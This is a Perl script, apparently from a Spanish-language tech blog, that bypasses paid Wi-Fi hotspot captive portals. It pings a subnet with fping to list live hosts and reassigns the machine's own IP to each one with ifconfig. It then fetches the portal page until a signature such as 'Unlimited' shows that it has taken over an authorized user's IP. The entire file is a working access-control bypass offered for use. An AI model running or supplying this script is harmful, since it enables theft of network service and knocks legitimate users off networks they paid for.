#!/usr/bin/perl
############################################################
# Junio 2014
# http://otroblogdetecnologias.blogspot.com
# buscadorHotSpot.pl 
#
# Ejecutar desde una cuenta con acceso a cambios de configuraciones
# de red, o desde una cuenta root.
#
# Script que encuentra numeros de IP's validos para un 
# rango dado.
# Dependencia de los comandos Unix
#	fping -> utilidad para realizar barridos de IPs http://fping.sourceforge.net/
#	sort -> ordenamiento de archivos de texto
# 	ifconfig -> configuracion de red en Unix/Linux
#
############################################################
use LWP::UserAgent;
use HTTP::Request;

############################################################
# Obtiene un listado de los numeros de IPs asignados en la red
# Guarda en un archivo el resultado
############################################################
sub getIpRange{
	my ($ipRangeF,$maskF,$listFileF)=@_;
	my $tempFileF="temp.txt";
	my $errFileF="error.txt";
	print "SCANNING IP's ==>\n";
	system("/usr/sbin/fping -a -g $ipRangeF/$maskF 1>$tempFileF 2>$errFileF");
	system("/usr/bin/sort $tempFileF > $listFileF");
}
############################################################
# Obtiene numeros de IPs de un listado previamente generado
# y lo recorre hasta encontrar la IP autorizada para navegar
############################################################
sub getIpsFromList{
	my($interfaceF, $maskF, $listFileF, $urlSeekF, $fileHTMLPage, $signingConnectedF,$signingUnConnectedF)=@_;
	my $ipToTestF;
	my $count=0;
	open(FILE_LIST_IP,"<",$listFileF) or die;
	while(<FILE_LIST_IP>){
		$ipToTestF=$_;
		if($count!=0){
			print "Testeando IP ==> $ipToTestF \n";
			########################################
			configureNet($interfaceF,$ipToTestF,$maskF);
			testPage($urlSeekF,$fileHTMLPage);
			if(&parseConect($fileHTMLPage,$signingConnectedF,$signingUnConnectedF)){
				print "====> IP AUTORIZADA-> $ipToTestF\n";
				print "= Navegador listo y a utilizar internet!\n";
				exit(0);
			}
			########################################
		}		
		$count++;
	}
	close(FILE_LIST_IP);
}
############################################################
# Configura la red con un numero de ip especifico
############################################################
sub configureNet{
	my($interfaceF,$ipF,$maskF)=@_;
	system("/usr/sbin/ifconfig $interfaceF $ipF");	
}

############################################################
# Realiza una conexion al sitio del HOT SPOT 
############################################################
sub testPage{
	my ($urlBuscar,$archivo)=@_;
	############################################
	my $ua=LWP::UserAgent->new;
	$ua->agent("Mozilla/5.0 (X11; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0");
	
	my $req=HTTP::Request->new(GET=>$urlBuscar);
	my $response= $ua->request($req);
	my $content=$response->content();
	############################################
	# abrir archivo segun parametro
	open(FH,">",$archivo);
	############################################
	print FH $content;
	close(FH);
}
############################################################
# Verifica si el sitio visitado ha devuelto AUTORIZADO o
# NO AUTORIZADO
############################################################
sub parseConect{
	my($fileParseF,$signingConnected,$signingUnConnected)=@_;
	my $content;
	my $flagToReturn=-1;
	open(FH,"<",$fileParseF)or die;
	############################################
	while (<FH>){
		chomp;
		#del archivo temporal obtiene las lineas con arroba
		if (/$signingUnConnected/) {
			$content=$_;
			#NO AUTORIZADO
			$flagToReturn=0;
		}
		if (/$signingConnected/){
			$content=$_;
			#AUTORIZADO
			$flagToReturn=1;
		}		
	}	
	close(FH);
	$flagToReturn;
}
############################################################
# Programa principal
############################################################	
	#################################################
	#Parametros necesarios para configurar el script
	my $ipRange="192.168.90.0";
	my $ipMask="24";	
	my $listFileName="ipRange.txt";
	my $interface="enp1s0f2";
	my $urlToTest="http://aplogin.com/?url=http://www.google.com";
	my $fileHTMLDownload="pagina.html";
#	Firma que indica que se encuentra autorizado
	#<span id="countdown">Unlimited</span>
	my $firmaConnected="Unlimited";
#	Firma que indica que no se encuentra autorizado para navegar
#	<input type="text" name="code" size="14" autocomplete="off" style="font: 12px arial, helvetica, sans-serif">
	my $firmaUnConnected="code";	
	#################################################
	print "##################################################\n";	
	print "http://otroblogdetecnologias.blogspot.com\n";	
	print "by Juan Carlos Miranda - Junio 2014\n";	
	print "Bypass de HOT SPOT. Busqueda de IPs autorizadas en redes WIFI con HOT SPOTs\n";	
	print "##################################################\n";	
	getIpRange($ipRange,$ipMask,$listFileName);
	getIpsFromList($interface,$ipMask,$listFileName,$urlToTest,$fileHTMLDownload,$firmaConnected,$firmaUnConnected);
############################################################
# Fin Programa principal
############################################################	
